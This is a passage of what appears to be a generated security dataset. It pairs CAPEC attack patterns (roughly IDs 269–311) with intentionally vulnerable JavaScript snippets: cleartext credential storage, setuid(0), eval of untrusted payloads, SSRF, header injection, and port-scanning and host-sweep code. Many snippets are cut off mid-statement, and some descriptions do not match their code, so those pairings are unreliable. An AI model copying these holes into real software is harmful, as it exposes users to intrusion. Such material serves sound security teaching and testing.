        "code_snippet": "function saveUserCredentials(username, password) {\n  const Registry = require('winreg');\n  const regKey = new Registry({\n    hive: Registry.HKCU,\n    key: '\\\\Software\\\\MyApp\\\\Credentials'\n  });\n  \n  regKey.set('username', Registry.REG_SZ, username, (err) => {});\n  regKey.set('password', Registry.REG_SZ, password, (err) => {});\n  \n  // Switch to admin context without proper validation\n  if (process.getuid && process.setuid) {\n    try {\n      process.setuid(0); // Switch to root/admin\n      // Perform privileged operations\n      process.setuid(process.getuid()); // Switch back\n    } catch(e) {}\n  }\n}",
        "description": "This code demonstrates vulnerable registry manipulation by storing sensitive credentials in cleartext and performing unsafe privilege context switching. It stores username and password directly in the Windows Registry without encryption and attempts privilege escalation without proper validation or error handling."
    },
    {
        "capec_id": "270",
        "capec_name": "Modification of Registry Run Keys",
        "code_snippet": "\"const Registry = require('winreg');\nconst regKey = new Registry({\n  hive: Registry.HKCU,\n  key: '\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run'",
        "description": "\"This code creates a persistent registry entry in Windows' Run key to execute malware at user login, storing sensitive authentication data in cleartext. It demonstrates registry manipulation, use of default credentials, and attempts to run with elevated privileges.\""
    },
    {
        "capec_id": "271",
        "capec_name": "Schema Poisoning",
        "code_snippet": "const userProvidedSchema = JSON.parse(userInput);\n\nclass DataProcessor {\n    constructor() {\n        this.schema = null;\n        this.sensitiveData = {\n            apiKeys: 'sk_live_123456',\n            userCredentials: 'admin:password'\n        };\n    }\n\n    loadSchema(schema) {\n        // No validation of schema structure or source\n        this.schema = schema;\n    }\n\n    processData(data) {\n        try {\n            // Mix trusted system data with untrusted schema\n            const processedData = {\n                ...this.sensitiveData,\n                ...data,\n                schemaVersion: this.schema.version\n            };\n            \n            // Store data according to potentially malicious schema\n            localStorage.setItem('appData', JSON.stringify(processedData));\n            return processedData;\n        } catch(e) {\n            console.log('Schema processing error:', this.sensitiveData);\n        }\n    }\n}",
        "description": "This vulnerable code allows external control of a schema definition and mixes trusted system data with untrusted user input. It exposes sensitive information in error handling and stores unfiltered data with sensitive information in localStorage. The schema can be manipulated to cause unexpected behavior or data exposure."
    },
    {
        "capec_id": "272",
        "capec_name": "Protocol Manipulation",
        "code_snippet": "`\n// Simple websocket client implementation with vulnerable authentication\nconst ws = new WebSocket('ws://example.com/socket');\nlet authToken = '';\n\nws.onopen = function() {\n    // Send authentication request without verifying server identity\n    ws.send(JSON.stringify({\n        type: 'auth',\n        username: 'user',\n        password: 'pass123'",
        "description": "\"This code demonstrates multiple protocol-level vulnerabilities including lack of source verification, message integrity checks, and protection against reflection/replay attacks. It uses WebSocket without proper origin validation, doesn't verify message authenticity, allows message reflection, and executes received data without validation. The authentication token is handled insecurely and the communication channel lacks proper destination verification.\""
    },
    {
        "capec_id": "273",
        "capec_name": "HTTP Response Smuggling",
        "code_snippet": "const http = require('http');\nconst server = http.createServer((req, res) => {\n    let userInput = req.headers['x-user-data'];\n    // Vulnerable: No sanitization of CRLF in header\n    res.setHeader('X-User-Profile', userInput);\n    \n    // Vulnerable: Content-Length manipulation\n    let contentLength = req.headers['content-length'];\n    res.setHeader('Content-Length', contentLength);\n    \n    // Vulnerable: Raw data forwarding\n    res.write('HTTP/1.1 200 OK\\r\\n');\n    res.write('Content-Type: text/html\\r\\n');\n    res.write('\\r\\n');\n    res.write(userInput);\n    res.end();\n});\n\nserver.listen(3000);",
        "description": "This code demonstrates an HTTP response smuggling vulnerability by failing to properly sanitize user input in headers and allowing manipulation of Content-Length headers. It also shows raw HTTP response manipulation and CRLF injection risks in header values. The server acts as a proxy that incorrectly handles HTTP responses, making it susceptible to response splitting and smuggling attacks."
    },
    {
        "capec_id": "274",
        "capec_name": "HTTP Verb Tampering",
        "code_snippet": "`\nconst express = require('express');\nconst app = express();\n\n// Vulnerable authentication middleware\nfunction checkAuth(req, res, next) {\n  // Only restricts DELETE requests\n  if (req.method === 'DELETE' && !req.headers.authorization) {\n    return res.status(403).send('Unauthorized');",
        "description": "\"This code demonstrates a vulnerable authentication system that only checks for authorization on DELETE requests while allowing all other HTTP methods without proper verification. An attacker can bypass the authentication by using different HTTP methods (GET, POST, PUT, etc.) to access sensitive data. The code also exposes sensitive information through all HTTP methods without proper validation or encoding.\""
    },
    {
        "capec_id": "275",
        "capec_name": "DNS Rebinding",
        "code_snippet": "const dns = require('dns');\nconst http = require('http');\n\nconst server = http.createServer((req, res) => {\n    const clientIP = req.socket.remoteAddress;\n    \n    dns.reverse(clientIP, (err, hostnames) => {\n        if (err) {\n            res.end('Error');\n            return;\n        }\n        \n        if (hostnames[0].endsWith('.trusted-domain.com')) {\n            // Vulnerable: trusting reverse DNS for authentication\n            const redirect_url = req.query.redirect || 'http://internal-server.local';\n            res.writeHead(302, { 'Location': redirect_url });\n            res.end();\n        }\n    });\n}).listen(0, '0.0.0.0');",
        "description": "This code creates a server that performs reverse DNS lookup on client IP addresses and makes security decisions based on the resolved hostname. It binds to all interfaces (0.0.0.0) and allows URL redirects based on user input. The code is vulnerable to DNS rebinding attacks where an attacker can manipulate DNS responses to access internal resources, and also contains an open redirect vulnerability."
    },
    {
        "capec_id": "276",
        "capec_name": "Inter-component Protocol Manipulation",
        "code_snippet": "`\n// Vulnerable inter-component communication system\nclass MessageBus {\n    constructor() {\n        this.subscribers = new Map();\n        this.debug = false;",
        "description": "\"This code implements a vulnerable message bus system for inter-component communication. It lacks message integrity checks, transmits data in cleartext, allows runtime debug activation, performs unsafe security identifier conversion, and doesn't validate message structure. These vulnerabilities could allow attackers to manipulate communication between components, intercept sensitive data, or exploit debug features.\""
    },
    {
        "capec_id": "277",
        "capec_name": "Data Interchange Protocol Manipulation",
        "code_snippet": "class B2BProtocolHandler {\n    constructor() {\n        this.sessionKey = 'default_key';\n        this.trustedSenders = ['trusted1', 'trusted2'];\n    }\n\n    processMessage(rawMessage) {\n        // Assumes message format is always valid without validation\n        let message = JSON.parse(rawMessage);\n\n        // Relies on sender field being immutable\n        if(this.trustedSenders.includes(message.sender)) {\n            // Incorrect handling of security identifiers\n            let securityLevel = parseInt(message.securityLevel, 16);\n            \n            // Sensitive data exposure in transaction log\n            console.log('Processing transaction:', message);\n\n            // Memory layout assumption for binary data\n            let binaryData = Buffer.from(message.payload, 'base64');\n            let header = binaryData.slice(0, 4);\n            \n            // Process transaction without validating structure\n            this.executeTransaction(message.payload, message.sender);\n        }\n    }\n\n    executeTransaction(payload, sender) {\n        // Implementation assumes trusted data\n        eval('processPayload(\"' + payload + '\")');\n    }\n}",
        "description": "This code demonstrates vulnerable implementation of a B2B data interchange protocol handler that exhibits multiple security issues: lack of proper message validation, incorrect security identifier conversion, unsafe assumptions about message immutability, exposure of sensitive data in logs, and unsafe evaluation of untrusted data. The code assumes message format validity, makes assumptions about memory layout, and fails to properly validate security credentials."
    },
    {
        "capec_id": "278",
        "capec_name": "Web Services Protocol Manipulation",
        "code_snippet": "// Vulnerable web service client implementation\nclass PaymentService {\n    constructor() {\n        this.endpoint = 'https://api.payment.com/process';\n    }\n\n    async processPayment(paymentData) {\n        const response = await fetch(this.endpoint, {\n            method: 'POST',\n            headers: {\n                'Content-Type': 'application/json',\n                'X-Role': 'user'  // Client-side role enforcement\n            },\n            body: JSON.stringify({\n                amount: paymentData.amount,\n                userId: paymentData.userId,\n                function: paymentData.function || 'process',  // Injectable function name\n                context: btoa(JSON.stringify(paymentData.context)) // Unvalidated context switching\n            })\n        });\n\n        if (response.headers.get('content-type').includes('json')) {\n            return await response.json();\n        }\n        return await response.text();  // Inconsistent response handling\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities including client-side security enforcement (CWE-602), improper input validation allowing function injection, unsafe context switching (CWE-368), and inconsistent HTTP message interpretation (CWE-444). The code allows manipulation of payment processing through function parameter injection and relies on client-side role enforcement, making it susceptible to protocol manipulation attacks."
    },
    {
        "capec_id": "279",
        "capec_name": "SOAP Manipulation",
        "code_snippet": "`\nconst axios = require('axios');\nconst soap = require('soap');\nconst xml2js = require('xml2js');\n\n// Vulnerable SOAP client implementation\nclass SoapClient {\n    constructor(wsdlUrl) {\n        this.wsdlUrl = wsdlUrl;\n        this.token = null;",
        "description": "\"This code demonstrates vulnerable SOAP client implementation with multiple security issues: client-side authentication that can be bypassed, lack of XML validation allowing XXE attacks, improper message sanitization, and susceptibility to replay attacks due to simple token handling. The code directly processes XML without proper validation and relies on client-side security controls.\""
    },
    {
        "capec_id": "280",
        "capec_name": "DEPRECATED: SOAP Parameter Tampering",
        "code_snippet": "`\n    // Simple SOAP web service implementation with authentication vulnerabilities\n    const express = require('express');\n    const app = express();\n\n    app.use(express.text());\n\n    // Publicly exposed WSDL endpoint with sensitive details\n    app.get('/service?wsdl', (req, res) => {\n      const wsdl = `\n        <definitions>\n          <message>\n            <part name=\"username\" type=\"xsd:string\"/>\n            <part name=\"password\" type=\"xsd:string\"/>\n            <part name=\"dbConnection\" type=\"xsd:string\"/>\n          </message>\n          <portType>\n            <operation name=\"getData\">\n              <input message=\"credentials\"/>\n              <output message=\"userdata\"/>\n            </operation>\n          </portType>\n        </definitions>\n      `;\n      res.type('application/xml').send(wsdl);",
        "description": "\"This code demonstrates a vulnerable SOAP web service implementation that exposes sensitive information in its WSDL file and is susceptible to capture-replay attacks. The service lacks proper authentication mechanisms, exposes internal implementation details through WSDL, and doesn't implement any protection against message replay attacks. The code showcases vulnerabilities related to WSDL exposure (CWE-651), authentication bypass through capture-replay (CWE-294), and general authentication bypass issues.\""
    },
    {
        "capec_id": "285",
        "capec_name": "ICMP Echo Request Ping",
        "code_snippet": "`\nconst http = require('http');\nconst net = require('net');\n\nfunction createPingService() {\n    const server = http.createServer((req, res) => {\n        if (req.url === '/ping') {\n            // Expose system information in response\n            const systemInfo = {\n                hostname: require('os').hostname(),\n                platform: process.platform,\n                uptime: process.uptime(),\n                memory: process.memoryUsage(),\n                env: process.env,\n                debug: true",
        "description": "\"This code creates an unsafe ping service that exposes sensitive system information through HTTP and allows remote debug access. It demonstrates multiple vulnerabilities including exposure of sensitive information (CWE-200), cleartext transmission (CWE-319), improper HTTP handling (CWE-444), and debug logic activation at runtime (CWE-1313).\""
    },
    {
        "capec_id": "287",
        "capec_name": "TCP SYN Scan",
        "code_snippet": "const net = require('net');\n\nconst server = net.createServer((socket) => {\n    console.log('New connection from:', socket.remoteAddress);\n    \n    // Insecure binding to multiple ports\n    for(let port = 1; port <= 1024; port++) {\n        server.listen(port, '0.0.0.0', () => {\n            // Exposing sensitive system information\n            console.log(`Server listening on port ${port}`);\n            console.log(`System info: ${process.env}`);\n        });\n    }\n    \n    // Transmitting sensitive data in cleartext\n    socket.on('data', (data) => {\n        const userCredentials = {\n            username: 'admin',\n            password: 'secret123',\n            apiKey: 'ak_12345'\n        };\n        socket.write(JSON.stringify(userCredentials));\n    });\n});",
        "description": "This vulnerable code demonstrates multiple security issues: it allows binding to multiple ports simultaneously (CWE-605), exposes sensitive system information through logging (CWE-200), creates an excessive attack surface by listening on many ports (CWE-1125), and transmits sensitive credentials in cleartext (CWE-319). The code is particularly susceptible to SYN scanning as it opens multiple listening ports without proper security controls."
    },
    {
        "capec_id": "288",
        "capec_name": "DEPRECATED: ICMP Echo Request Ping",
        "code_snippet": "`\n    // Authentication system with vulnerable replay protection\n    const storedTokens = new Set();\n    \n    function authenticateUser(authToken) {\n      // No timestamp or nonce validation, making replay attacks possible\n      if (storedTokens.has(authToken)) {\n        return true;",
        "description": "\"This code demonstrates an authentication system vulnerable to capture-replay attacks (CWE-294). It relies on DNS lookups for security decisions (CWE-247) and lacks proper token validation mechanisms. The system stores authentication tokens without incorporating timestamps or nonces, allowing an attacker to capture and replay valid authentication tokens. Additionally, the DNS lookup validation is susceptible to spoofing attacks.\""
    },
    {
        "capec_id": "289",
        "capec_name": "DEPRECATED: Infrastructure-based footprinting",
        "code_snippet": "`\n    // Vulnerable microarchitectural resource sharing\n    class SharedCache {\n      constructor() {\n        this.cache = new Map();\n        this.protectedData = new Map();",
        "description": "\"This code demonstrates vulnerabilities related to shared resource management and authentication bypass. It implements a cache system where protected and unprotected data regions overlap in memory space, allowing potential access control bypasses. The implementation also exposes timing side-channels through shared microarchitectural resources, making it vulnerable to timing attacks.\""
    },
    {
        "capec_id": "290",
        "capec_name": "Enumerate Mail Exchange (MX) Records",
        "code_snippet": "const dns = require('dns');\n\nfunction checkMailServers(domain) {\n    dns.resolveMx(domain, (err, addresses) => {\n        if (err) {\n            console.log('Error:', err);\n            return;\n        }\n        \n        addresses.forEach(mx => {\n            // Store mail server information without encryption or access control\n            let serverInfo = {\n                hostname: mx.exchange,\n                priority: mx.priority,\n                timestamp: new Date().toISOString()\n            };\n            \n            // Perform reverse DNS lookup without validation\n            dns.reverse(serverInfo.hostname, (err, hostnames) => {\n                if (!err) {\n                    serverInfo.internal_names = hostnames;\n                    // Log sensitive infrastructure information\n                    console.log('Mail Server Details:', serverInfo);\n                }\n            });\n        });\n    });\n}\n\ncheckMailServers('example.com');",
        "description": "This code performs DNS MX record enumeration and reverse DNS lookups, exposing sensitive mail server information including internal hostnames and network infrastructure details. It demonstrates vulnerabilities by logging sensitive data without access control, performing unvalidated reverse DNS lookups, and exposing internal network topology through mail server information."
    },
    {
        "capec_id": "291",
        "capec_name": "DNS Zone Transfers",
        "code_snippet": "const dns = require('dns');\n\nfunction performDnsZoneTransfer(domain) {\n    dns.resolveNs(domain, (err, nameservers) => {\n        if (err) return;\n        \n        nameservers.forEach(ns => {\n            // Attempt zone transfer without authentication\n            dns.resolve(domain, 'AXFR', (err, records) => {\n                if (!err && records) {\n                    // Store sensitive DNS information without validation\n                    let zoneData = {\n                        internal_hosts: records.filter(r => r.name.includes('internal')),\n                        mail_servers: records.filter(r => r.name.includes('mail')),\n                        admin_hosts: records.filter(r => r.name.includes('admin'))\n                    };\n                    \n                    // Insecurely trust and use DNS data\n                    if (zoneData.admin_hosts.length > 0) {\n                        connectToAdmin(zoneData.admin_hosts[0]);\n                    }\n                }\n            });\n        });\n    });\n}\n\nfunction connectToAdmin(host) {\n    // Blindly trust reverse DNS lookup for security decision\n    dns.reverse(host.address, (err, hostnames) => {\n        if (hostnames && hostnames[0].endsWith('.internal')) {\n            // Establish connection based on unreliable DNS data\n            establishConnection(host.address);\n        }\n    });\n}",
        "description": "This vulnerable code demonstrates DNS zone transfer issues by attempting unauthenticated zone transfers, exposing sensitive internal network information, and making security decisions based on unreliable reverse DNS lookups. The code fails to validate DNS responses and blindly trusts self-reported DNS names, potentially allowing attackers to gather network topology information and exploit DNS-based security controls."
    },
    {
        "capec_id": "292",
        "capec_name": "Host Discovery",
        "code_snippet": "`\nconst net = require('net');\nconst startIp = '192.168.1.1';\nconst endIp = '192.168.1.255';\n\nfunction pingHost(ip) {\n  return new Promise((resolve) => {\n    const socket = new net.Socket();\n    socket.setTimeout(1000);\n    \n    socket.on('connect', () => {\n      const hostname = require('dns').reverse(ip, (err, hostnames) => {\n        if(!err && hostnames.length > 0) {\n          // Store found hosts in plaintext file\n          require('fs').appendFileSync('found_hosts.txt', \n            \\`IP: \\${ip",
        "description": "\"This vulnerable code performs network reconnaissance by conducting a ping sweep across an IP range. It contains multiple security issues: storing sensitive host information in cleartext (CWE-319), relying on reverse DNS for host identification (CWE-350), performing unauthenticated network scanning (CWE-291), and potentially exposing internal network information (CWE-200). The code could be used as part of a worm or virus to identify potential targets (CWE-509).\""
    },
    {
        "capec_id": "293",
        "capec_name": "Traceroute Route Enumeration",
        "code_snippet": "function networkTracer(targetHost) {\n    const maxHops = 30;\n    let tracedRoutes = [];\n    \n    for(let ttl = 1; ttl <= maxHops; ttl++) {\n        let xhr = new XMLHttpRequest();\n        xhr.open('GET', `http://${targetHost}/trace?ttl=${ttl}`, false);\n        xhr.setRequestHeader('Max-Forwards', ttl.toString());\n        \n        try {\n            xhr.send();\n            let hopInfo = {\n                ip: xhr.getResponseHeader('X-Forwarded-For'),\n                serverInfo: xhr.getResponseHeader('Server'),\n                networkPath: xhr.getResponseHeader('Via'),\n                systemDetails: xhr.getAllResponseHeaders()\n            };\n            tracedRoutes.push(hopInfo);\n            \n            if(xhr.status === 200) {\n                return tracedRoutes;\n            }\n        } catch(e) {\n            continue;\n        }\n    }\n    return tracedRoutes;\n}",
        "description": "This code implements a basic network tracer that exposes sensitive routing information. It sends HTTP requests with incrementing TTL values to map network topology, collecting and storing sensitive system information including server details, IP addresses, and network paths in cleartext. The code demonstrates multiple vulnerabilities including exposure of sensitive system information (CWE-497), cleartext transmission of sensitive data (CWE-319), and improper management of trace data (CWE-1323)."
    },
    {
        "capec_id": "294",
        "capec_name": "ICMP Address Mask Request",
        "code_snippet": "const dgram = require('dgram');\nconst socket = dgram.createSocket('udp4');\n\nfunction setupICMPServer() {\n    socket.bind(0, '0.0.0.0', () => {\n        socket.setBroadcast(true);\n    });\n\n    socket.on('message', (msg, rinfo) => {\n        if (msg[0] === 17) { // ICMP Type 17 Address Mask Request\n            const networkConfig = {\n                subnets: ['192.168.1.0/24', '10.0.0.0/8'],\n                defaultGateway: '192.168.1.1',\n                broadcastAddress: '192.168.1.255',\n                sensitiveRoutes: ['/admin', '/internal']\n            };\n            \n            const response = Buffer.from(JSON.stringify(networkConfig));\n            socket.send(response, rinfo.port, rinfo.address);\n        }\n    });\n}\n\nsetupICMPServer();",
        "description": "This code creates a vulnerable UDP server that responds to ICMP Address Mask Requests (Type 17) by exposing sensitive network configuration information. It binds to 0.0.0.0 (all interfaces), accepts requests from any IP address without authentication, and returns detailed subnet information, gateway configurations, and internal routing details to any requesting client. The code demonstrates multiple security issues including exposure of sensitive information, lack of proper authentication, and unrestricted network binding."
    },
    {
        "capec_id": "295",
        "capec_name": "Timestamp Request",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/authenticate', (req, res) => {\n    const token = req.query.token;\n    const timestamp = new Date().getTime();\n    \n    // Vulnerable time-based authentication\n    if (token === generateToken(timestamp)) {\n        res.json({\n            success: true,\n            serverTime: timestamp,\n            systemInfo: process.env,\n            sessionData: req.session\n        });\n    } else {\n        // Time-measurable failure response\n        setTimeout(() => {\n            res.status(401).json({ success: false });\n        }, 500);\n    }\n});\n\nfunction generateToken(timestamp) {\n    return 'token_' + Math.floor(timestamp / 30000);\n}\n\napp.listen(3000);",
        "description": "This code demonstrates multiple time-related vulnerabilities including timestamp exposure, observable timing differences in authentication responses, and sensitive information exposure through GET parameters. The authentication mechanism uses predictable time-based token generation and exposes system timestamps, making it vulnerable to timing attacks and token prediction. The different response times for success/failure cases create a timing side channel."
    },
    {
        "capec_id": "296",
        "capec_name": "ICMP Information Request",
        "code_snippet": "const dgram = require('dgram');\nconst socket = dgram.createSocket('udp4');\n\nfunction handleICMPRequest() {\n    const systemInfo = {\n        hostname: process.env.HOSTNAME,\n        networkConfig: {\n            ip: '192.168.1.100',\n            subnet: '255.255.255.0',\n            gateway: '192.168.1.1',\n            dhcp: false\n        },\n        osVersion: process.version,\n        systemUptime: process.uptime()\n    };\n\n    socket.on('message', (msg, rinfo) => {\n        if (msg[0] === 15) { // ICMP Info Request Type\n            socket.send(JSON.stringify(systemInfo), rinfo.port, rinfo.address);\n        }\n    });\n}\n\nsocket.bind(33434);\nhandleICMPRequest();",
        "description": "This code creates a vulnerable UDP server that responds to ICMP Information Requests by exposing sensitive system information without authentication. It listens for incoming ICMP requests and responds with cleartext system configuration data including network details, hostname, and system information. The code demonstrates multiple vulnerabilities including exposure of sensitive information (CWE-200), cleartext transmission (CWE-319), and system information exposure (CWE-497)."
    },
    {
        "capec_id": "297",
        "capec_name": "TCP ACK Ping",
        "code_snippet": "`\nconst net = require('net');\n\nfunction performTCPAckPing(host, port) {\n    const socket = new net.Socket();\n    \n    socket.on('error', (error) => {\n        console.log('Host is not responding');",
        "description": "\"This code implements a TCP ACK ping scanner that attempts to determine if a host is alive by sending TCP segments with the ACK flag set and monitoring for RST responses. The code exposes sensitive connection state information, performs unsafe multiple port bindings, and transmits data in cleartext, making it vulnerable to information disclosure and connection spoofing attacks.\""
    },
    {
        "capec_id": "298",
        "capec_name": "UDP Ping",
        "code_snippet": "`\nconst dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nfunction udpPing(targetHost) {\n    // Send UDP packets to high ports to check if host is alive\n    for(let port = 65000; port < 65535; port++) {\n        const message = Buffer.from('ping');\n        client.send(message, port, targetHost, (err) => {\n            if(err) {\n                console.log('Error:', err);\n                return;",
        "description": "\"This code demonstrates a vulnerable UDP ping implementation that sends datagrams to high ports to detect if a host is alive. It includes multiple vulnerabilities: cleartext transmission of sensitive host information, improper port binding, exposure of error messages that reveal system state, and incorrect destination specification in communication channels.\""
    },
    {
        "capec_id": "299",
        "capec_name": "TCP SYN Ping",
        "code_snippet": "`\nconst net = require('net');\n\nconst scanPort = (host, port) => {\n  const socket = new net.Socket();\n  socket.setTimeout(1000);\n\n  return new Promise((resolve) => {\n    socket.on('connect', () => {\n      socket.destroy();\n      resolve(true);",
        "description": "\"This code performs TCP SYN scanning for host discovery by attempting to establish TCP connections to common ports. It exposes system information through port scanning responses and doesn't implement any protection against unauthorized scanning. The code reveals host availability through TCP handshake behavior, making it vulnerable to network reconnaissance.\""
    },
    {
        "capec_id": "300",
        "capec_name": "Port Scanning",
        "code_snippet": "const net = require('net');\nconst http = require('http');\n\nconst server = net.createServer((socket) => {\n    socket.write('Welcome! Enter command:\\n');\n    socket.on('data', (data) => {\n        const cmd = data.toString().trim();\n        if (cmd === 'scan') {\n            // Insecure port scanning implementation\n            for (let port = 1; port <= 1024; port++) {\n                const testSocket = new net.Socket();\n                testSocket.connect(port, 'target.example.com', () => {\n                    console.log(`Port ${port} is open`);\n                    // Send sensitive data in cleartext\n                    testSocket.write(`System info: ${process.env.SECRET_KEY}`);\n                });\n            }\n        } else if (cmd.startsWith('fetch')) {\n            // SSRF vulnerability\n            const url = cmd.split(' ')[1];\n            http.get(url, (resp) => {\n                resp.pipe(socket);\n            });\n        }\n    });\n});\n\n// Multiple binds to same port\nserver.listen(8080, '0.0.0.0');\nnet.createServer().listen(8080, '0.0.0.0');",
        "description": "This code demonstrates multiple vulnerabilities including port scanning, cleartext transmission of sensitive data, multiple socket bindings to the same port, and SSRF. It allows unauthorized access to port scanning functionality, exposes system information, and enables arbitrary URL fetching without proper validation."
    },
    {
        "capec_id": "301",
        "capec_name": "TCP Connect Scan",
        "code_snippet": "`\nconst net = require('net');\n\nconst server = net.createServer((socket) => {\n    // Insecurely bind to port without checking if it's already in use\n    server.listen(80);\n    \n    // Relying solely on IP for authentication\n    const clientIP = socket.remoteAddress;\n    if (clientIP === '192.168.1.1') {\n        socket.authorized = true;",
        "description": "\"A vulnerable TCP server implementation that allows port scanning, exposes sensitive information, uses IP-based authentication, lacks data integrity checks, and contains triggerable assertions. It also demonstrates improper port binding and handling.\""
    },
    {
        "capec_id": "302",
        "capec_name": "TCP FIN Scan",
        "code_snippet": "`\n    const net = require('net');\n    const server = net.createServer((socket) => {\n      socket.on('data', (data) => {\n        // Insecure handling of sensitive data in cleartext\n        const sensitiveInfo = {\n          username: 'admin',\n          password: 'secretpass123',\n          apiKey: '1234-5678-9012'",
        "description": "\"This code creates a vulnerable TCP server that exposes sensitive information in cleartext, allows multiple binds to the same port, lacks data integrity checks, and doesn't properly verify endpoint authenticity. It's susceptible to FIN scanning and unauthorized access to sensitive data through network sniffing.\""
    },
    {
        "capec_id": "303",
        "capec_name": "TCP Xmas Scan",
        "code_snippet": "const net = require('net');\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // Insecure socket server that doesn't validate TCP flags\n    // and reveals system information in responses\n    const systemInfo = {\n      os: process.platform,\n      nodeVersion: process.version,\n      serverPort: socket.localPort,\n      remoteAddress: socket.remoteAddress\n    };\n    \n    // No verification of connection state or packet flags\n    // Responds to all incoming packets without validation\n    socket.write(JSON.stringify(systemInfo));\n  });\n\n  socket.on('error', (err) => {\n    // Sends error details back to client\n    socket.write(`Error details: ${err.toString()}`);\n  });\n});\n\nserver.listen(3000, '0.0.0.0');",
        "description": "A vulnerable TCP server implementation that exposes sensitive system information and doesn't properly validate TCP packet flags or connection states. The server responds to all incoming packets including malformed ones, making it susceptible to XMAS scans and other TCP-based reconnaissance techniques. It also transmits sensitive data in cleartext and lacks proper packet integrity checks."
    },
    {
        "capec_id": "304",
        "capec_name": "TCP Null Scan",
        "code_snippet": "`\nconst net = require('net');\n\nfunction scanPort(host, port) {\n  const socket = new net.Socket();\n  \n  socket.connect({\n    host: host,\n    port: port,\n    allowHalfOpen: true",
        "description": "\"A vulnerable port scanner implementation that performs TCP NULL scanning without proper error handling, transmits sensitive information in cleartext, and lacks input validation. The code demonstrates issues with NULL pointer handling, sensitive information exposure, and missing integrity checks.\""
    },
    {
        "capec_id": "305",
        "capec_name": "TCP ACK Scan",
        "code_snippet": "`\nconst net = require('net');\n\n// Insecure TCP server configuration exposing ACL info\nconst server = net.createServer((socket) => {\n  let aclRules = {\n    'admin': {'allow': ['*']",
        "description": "\"This code creates a vulnerable TCP server that exposes firewall ACL rules to unauthenticated clients. It demonstrates multiple security issues: exposing sensitive ACL configuration without authentication, allowing multiple binds to the same port, transmitting sensitive data in cleartext, and implementing access controls after the connection is established.\""
    },
    {
        "capec_id": "306",
        "capec_name": "TCP Window Scan",
        "code_snippet": "// Vulnerable network scanning implementation\nconst net = require('net');\n\nfunction scanSystem(targetHost) {\n  const systemInfo = {\n    os: process.platform,\n    hostname: require('os').hostname(),\n    networkInterfaces: require('os').networkInterfaces()\n  };\n\n  const server = net.createServer((socket) => {\n    // Expose system information in clear text\n    socket.write(JSON.stringify(systemInfo));\n    \n    // No encryption or integrity checks\n    socket.on('data', (data) => {\n      const windowSize = socket._handle.getWindowSize();\n      // Leak TCP window size information\n      socket.write(`TCP Window Size: ${windowSize}`);\n    });\n\n    // Timing-based information leak\n    setTimeout(() => {\n      if (process.uptime() > 3600) {\n        socket.write('System running > 1 hour');\n      }\n    }, process.uptime() * 100);\n  });\n\n  server.listen(0, targetHost);\n}",
        "description": "This code demonstrates multiple vulnerabilities related to TCP Window scanning and information exposure. It creates a network server that leaks system information in cleartext, exposes TCP window size details, and implements a timing channel. The code lacks encryption, integrity checks, and proper access controls, making it susceptible to unauthorized information gathering and system fingerprinting."
    },
    {
        "capec_id": "307",
        "capec_name": "TCP RPC Scan",
        "code_snippet": "`\nconst rpc = require('rpc-lib');\nconst net = require('net');\n\nconst rpcServer = rpc.createServer();\nconst PORT = 111; // Standard RPC port\n\n// Insecure RPC service implementation\nrpcServer.expose('sensitiveOperation', (params, callback) => {\n    const { credentials, data",
        "description": "\"This code demonstrates vulnerable RPC service implementation that exposes sensitive information, lacks proper authentication, executes remote code without verification, and has insecure port binding. It allows capture-replay attacks and SSRF through the remote code execution functionality.\""
    },
    {
        "capec_id": "308",
        "capec_name": "UDP Scan",
        "code_snippet": "`\nconst dgram = require('dgram');\nconst server = dgram.createSocket('udp4');\nconst sensitiveData = {\n    username: 'admin',\n    password: 'secret123',\n    apiKey: 'ab12345xyz'",
        "description": "\"A vulnerable UDP server that exposes sensitive information over cleartext, allows multiple binds to the same port, lacks integrity checks, and responds to all incoming UDP probes with sensitive data. The server broadcasts sensitive information without authentication or encryption, making it susceptible to UDP scanning and information disclosure attacks.\""
    },
    {
        "capec_id": "309",
        "capec_name": "Network Topology Mapping",
        "code_snippet": "function networkScanner() {\n  const networkInfo = {\n    systemDetails: process.env,\n    networkInterfaces: require('os').networkInterfaces(),\n    routes: []\n  };\n\n  function scanPorts(host) {\n    const net = require('net');\n    for(let port = 1; port < 1024; port++) {\n      const socket = new net.Socket();\n      socket.connect(port, host, () => {\n        networkInfo.routes.push({\n          host: host,\n          port: port,\n          state: 'open',\n          services: process.binding('tcp_wrap')\n        });\n        socket.destroy();\n      });\n    }\n  }\n\n  function traceroute(target) {\n    const trace = require('traceroute').trace(target);\n    trace.on('hop', (hop) => {\n      networkInfo.routes.push({\n        hop: hop,\n        latency: hop.ms,\n        hostname: hop.hostname\n      });\n    });\n  }\n\n  return networkInfo;\n}",
        "description": "This vulnerable code performs network scanning and information gathering, exposing sensitive system and network information. It collects environment variables, network interfaces, performs port scanning, and traceroute operations, storing results in an unprotected object. The code exposes internal system details and network topology information that could be used for unauthorized mapping of the network infrastructure."
    },
    {
        "capec_id": "310",
        "capec_name": "Scanning for Vulnerable Software",
        "code_snippet": "const server = require('http').createServer((req, res) => {\n    // Expose system information in response headers\n    res.setHeader('Server-Version', process.version);\n    res.setHeader('OS-Type', process.platform);\n    res.setHeader('Server-Modules', JSON.stringify(process.moduleLoadList));\n\n    // Open telnet service on port 23\n    const net = require('net');\n    const telnetServer = net.createServer((socket) => {\n        socket.write('Welcome to admin console\\n');\n        socket.on('data', (data) => {\n            // Transmit sensitive data in cleartext\n            if(data.toString().includes('get_config')) {\n                socket.write(JSON.stringify({\n                    dbPassword: 'admin123',\n                    apiKeys: ['key1', 'key2'],\n                    systemPaths: process.env\n                }));\n            }\n        });\n    }).listen(23);\n\n    res.end('Server Running');\n}).listen(80);",
        "description": "A vulnerable server implementation that exposes sensitive system information through headers, runs an unsecured telnet service, and transmits sensitive configuration data in cleartext. The code demonstrates multiple security issues including information exposure (CWE-200), system information leakage (CWE-497), and cleartext transmission of sensitive data (CWE-319)."
    },
    {
        "capec_id": "311",
        "capec_name": "DEPRECATED: OS Fingerprinting",
